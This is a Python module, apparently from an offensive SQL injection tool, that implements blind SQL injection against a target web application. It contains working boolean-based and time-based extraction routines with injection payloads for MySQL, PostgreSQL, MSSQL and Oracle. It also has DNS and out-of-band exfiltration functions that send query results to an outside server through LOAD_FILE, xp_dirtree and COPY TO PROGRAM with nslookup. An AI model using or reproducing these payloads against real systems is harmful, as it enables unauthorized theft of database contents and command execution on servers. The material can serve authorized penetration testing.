#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Blind SQL Injection Module
"""

import time
import statistics
from concurrent.futures import ThreadPoolExecutor
from utils.colors import Colors

class BlindSQLi:
    def __init__(self, injector):
        self.injector = injector
        self.dbms = injector.dbms
        self.baseline_true = None
        self.baseline_false = None
    
    def calibrate(self):
        """Calibrate true/false baselines"""
        print(f"{Colors.YELLOW}[*] Calibrating blind SQLi baselines...{Colors.END}")
        
        # True condition
        true_payload = "1' AND 1=1--"
        true_response = self.injector._inject(true_payload)
        
        # False condition  
        false_payload = "1' AND 1=2--"
        false_response = self.injector._inject(false_payload)
        
        self.baseline_true = len(true_response.text) if true_response else 0
        self.baseline_false = len(false_response.text) if false_response else 0
        
        print(f"{Colors.GREEN}[+] Baseline calibrated - True: {self.baseline_true}, False: {self.baseline_false}{Colors.END}")
    
    def is_true(self, response):
        """Determine if response indicates true condition"""
        if not response:
            return False
        
        current_len = len(response.text)
        diff_true = abs(current_len - self.baseline_true)
        diff_false = abs(current_len - self.baseline_false)
        
        return diff_true < diff_false
    
    def binary_search_char(self, query, position):
        """Binary search for character value"""
        low, high = 32, 126
        
        while low <= high:
            mid = (low + high) // 2
            
            payload = f"1' AND ASCII(SUBSTRING(({query}),{position},1))>{mid}--"
            response = self.injector._inject(payload)
            
            if self.is_true(response):
                low = mid + 1
            else:
                high = mid - 1
        
        return low
    
    def extract_string(self, query, max_length=100):
        """Extract string using boolean-based blind SQLi"""
        if not self.baseline_true:
            self.calibrate()
        
        result = ""
        for i in range(1, max_length + 1):
            char_code = self.binary_search_char(query, i)
            
            if char_code > 126 or char_code < 32:
                break
            
            result += chr(char_code)
            print(f"\r{Colors.CYAN}[*] Extracting: {result}{Colors.END}", end='')
        
        print()
        return result
    
    def time_based_char(self, query, position):
        """Extract character using time-based blind SQLi"""
        char = 0
        
        for bit in range(7, -1, -1):
            bit_value = 2 ** bit
            
            if self.dbms == 'mysql':
                payload = f"1' AND IF(ASCII(SUBSTRING(({query}),{position},1))&{bit_value}={bit_value},SLEEP(2),0)--"
            elif self.dbms == 'postgres':
                payload = f"1' AND CASE WHEN ASCII(SUBSTRING(({query}),{position},1))&{bit_value}={bit_value} THEN pg_sleep(2) ELSE 0 END--"
            elif self.dbms == 'mssql':
                payload = f"1'; IF ASCII(SUBSTRING(({query}),{position},1))&{bit_value}={bit_value} WAITFOR DELAY '0:0:2'--"
            elif self.dbms == 'oracle':
                payload = f"1' AND CASE WHEN BITAND(ASCII(SUBSTR(({query}),{position},1)),{bit_value})={bit_value} THEN (SELECT COUNT(*) FROM ALL_OBJECTS CROSS JOIN ALL_OBJECTS) ELSE 0 END--"
            
            start = time.time()
            response = self.injector._inject(payload)
            elapsed = time.time() - start
            
            if elapsed > 1.5:
                char |= bit_value
        
        return chr(char) if char > 0 else None
    
    def time_based_extract(self, query, max_length=100):
        """Extract string using time-based blind SQLi"""
        result = ""
        
        for i in range(1, max_length + 1):
            char = self.time_based_char(query, i)
            
            if not char:
                break
            
            result += char
            print(f"\r{Colors.CYAN}[*] Extracting: {result}{Colors.END}", end='')
        
        print()
        return result
    
    def dns_exfiltration(self, query, dns_server):
        """DNS exfiltration for blind SQLi"""
        if self.dbms == 'mysql':
            payload = f"1' AND LOAD_FILE(CONCAT('\\\\\\\\',({query}),'.{dns_server}\\\\a'))--"
        elif self.dbms == 'mssql':
            payload = f"1'; EXEC master..xp_dirtree '\\\\{dns_server}\\' + ({query}) + '\\a'--"
        elif self.dbms == 'postgres':
            payload = f"1'; COPY (SELECT ({query})) TO PROGRAM 'nslookup {dns_server}'--"
        else:
            return None
        
        self.injector._inject(payload)
        return True
    
    def out_of_band(self, query, oob_server):
        """Out-of-band data exfiltration"""
        if self.dbms == 'mysql':
            payload = f"1' AND LOAD_FILE(CONCAT('\\\\\\\\',({query}),'.{oob_server}\\\\a'))--"
        elif self.dbms == 'mssql':
            payload = f"1'; DECLARE @p VARCHAR(1024); SET @p=({query}); EXEC master..xp_dirtree @p--"
        else:
            return None
        
        self.injector._inject(payload)
        return True
